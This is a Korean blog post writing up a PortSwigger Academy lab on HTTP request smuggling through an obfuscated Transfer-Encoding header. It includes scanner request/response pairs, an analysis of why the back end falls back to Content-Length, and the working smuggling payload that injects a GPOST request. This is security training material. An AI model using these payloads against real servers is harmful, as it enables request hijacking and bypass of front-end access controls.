---
layout: post
title: "Burp Academy-HTTP Request Smuggling 관련 취약점: HTTP request smuggling, obfuscating the TE header"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, HTTP Request Smuggling]
toc: true
last_modified_at: 2023-12-31 22:00:00 +0900
---

# 개요
- HTTP Request Smuggling 취약점 문제이다. 
- 문제 주소: https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header
- 취약점 설명페이지: https://portswigger.net/web-security/request-smuggling
- 난이도: PRACTITIONER (보통)

# 랩 개요
- 이 랩은 프론트 엔드 서버와 백엔드 서버로 구성되어 있다. 프론트 엔드와 백엔드 서버는 HTTP요청을 서로 다른 방식으로 처리한다. 
- 프론트 엔드 서버는 GET이나 POST가 아닌 요청은 거부한다. 
- 랩을 풀려면 백엔드 서버에게 HTTP요청을 밀반입해서, 백엔드 서버가 다음 요청을 처리할 때 GPOST 라는 메서드를 처리하도록 만들면 된다. 

```
This lab involves a front-end and back-end server, and the two servers handle duplicate HTTP request headers in different ways. The front-end server rejects requests that aren't using the GET or POST method.

To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.
```

# 도전
TE.TE 는 어떻게 동작하는 걸까?

## 1. HTTP Request Smuggler 확장 프로그램으로 스캔 및 결과 분석 

일단 HTTP Request Smuggler 확장 프로그램으로 스캔해본다. 그러면 다음과 같이 두 개의 패턴에서 스머글링이 가능한 것으로 나온다. 

![HTTP Request Smuggler 스캔 결과](/images/burp-academy-hrs-3-1.png)

HTTP 요청과 응답은 세개가 주어졌다. 다음과 같다. 

요청 1. 바디는 13바이트다. CL헤더는 값이 정확하게 들어갔다. TE헤더가 두 개 들어가 있다. 하나는 `Transfer-Encoding: chunked`고, 하나는 `Transfer-encoding: identity`다. Transfer-Encoding의 Encoding부분의 대문자가 다르다. [여기](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Transfer-Encoding)에 의하면 identity라는 값은 의미없는 값인 것 같다. 

```http
POST / HTTP/1.1
Host: 0aca00b80465a02381d9cf8a001f0091.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Transfer-Encoding: chunked
Connection: close
Transfer-encoding: identity
Content-Length: 13

3\r\n
x=y\r\n
0\r\n
\r\n
```

응답 1. 200응답이 돌아왔다. 

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: session=tg2uruvnPjQL0BB3Qb7UCKeOEt2zRYyl; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 8255

<!DOCTYPE html>
<html>
...
```

요청 2. 바디는 11바이트다. **CL헤더는 값이 틀리게 들어갔다.** 요청1과 동일하게 TE헤더가 두 개 들어가 있다. 

```http
POST / HTTP/1.1
Host: 0aca00b80465a02381d9cf8a001f0091.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Transfer-Encoding: chunked
Connection: close
Transfer-encoding: identity
Content-length: 3

1\r\n
G\r\n
0\r\n
\r\n
```

응답 2. 200응답이 돌아왔다. 

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: session=ncaoJJ8hGZK3vnUeZOeFMyLR5f17BUuz; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 8255

<!DOCTYPE html>
<html>
...
```

요청 3. 바디는 13바이트다. CL헤더는 값이 정확하게 들어갔다. 요청1, 요청2와 동일하게 TE헤더가 두 개 들어가 있다. 

```http
POST / HTTP/1.1
Host: 0aca00b80465a02381d9cf8a001f0091.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Transfer-Encoding: chunked
Connection: close
Transfer-encoding: identity
Content-Length: 13

3\r\n
x=y\r\n
0\r\n
\r\n
```

응답 3. 이번에는 `"Unrecognized method G0POST"` 라는 응답이 돌아왔다. 스머글링이 가능해보인다. 

```http
HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 28

"Unrecognized method G0POST"
```

### 분석
요청2가 핵심인 것으로 보인다. 프론트 엔드는 `Transfer-Encoding` 헤더를 보고 이 요청을 백엔드로 보냈지만, 백엔드는 `Transfer-Encoding`헤더가 아니라 `Transfer-encoding` 헤더를 인식하고 `identity`라는 의미없는 값이 있으므로 CL헤더를 보는 것 같다. 따라서 3바이트 `1\r\n` 까지를 하나의 요청을 처리한다. 그 다음의 요청 `G0`는 요청3(`POST /`)과 함께 처리되어 `"Unrecognized method G0POST"`라는 응답이 돌아오는 것으로 보인다. 이 것은 결과적으로 동작상으로는 TE.CL과 동일하다. 

```http
POST / HTTP/1.1
Host: 0aca00b80465a02381d9cf8a001f0091.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Transfer-Encoding: chunked
Connection: close
Transfer-encoding: identity
Content-length: 3

1\r\n
G\r\n
0\r\n
\r\n
```

## 2. 페이로드 준비 
TE.CL과 같은 원리이므로 페이로드도 그에 맞춰서 준비하면 된다. 스머글링 문제2의 페이로드를 참고해서 준비한다. 

다음이 TE.CL의 기본형이다. 

```http
POST / HTTP/1.1
Host: xxxx.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 5
Transfer-Encoding: chunked

x=1
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

여기에 TE헤더를 애매하게(Obfuscating)만들기 위한 헤더 `Transfer-encoding: identity`를 추가한다. 다음과 같다. 이 페이로드가 전달되면 백엔드에는 `x=1\r\n` 까지를 하나의 요청으로 처리하고, 다음 요청은 `GPOST ~` 가 될 것이다. 

```http
POST / HTTP/1.1
Host: xxxx.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 5
Transfer-Encoding: chunked
Transfer-encoding: identity

x=1
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

## 3. 스머글링 시도 

그런데 문제2와 마찬가지로 위의 x=1가 있으면 어째선지 `"error":"Invalid request"`가 돌아온다. 

![스머글링 실패](/images/burp-academy-hrs-3-2.png)

x=1을 5c로 바꾸고, CL헤더 길이를 4로 바꿔서 보낸다. 첫번째 요청은 200응답이 돌아오고, 동일한 요청을 한번더 보내면 `"Unrecognized method GPOST"` 메세지가 돌아온다. 

![풀이 성공시의 요청](/images/burp-academy-hrs-3-3.png)

풀이 성공시의 요청이다.

```http
POST / HTTP/1.1
Host: 0a9c00e6035881fc81126b97009600a1.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: identity

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

풀이에 성공했다는 메세지가 출력된다. 

![풀이 성공](/images/burp-academy-hrs-3-success.png)

# 정리 
TE.TE 는 프론트 엔드와 백엔드가 서로다른 TE를 보는 경우, 백엔드의 TE에 의미없는 값 `identity`를 넣어서 백엔드가 CL헤더를 보도록 만드는, 그래서 결과적으로 TE.CL로 동작하게 만드는 테크닉인 것을 알게 되었다. 

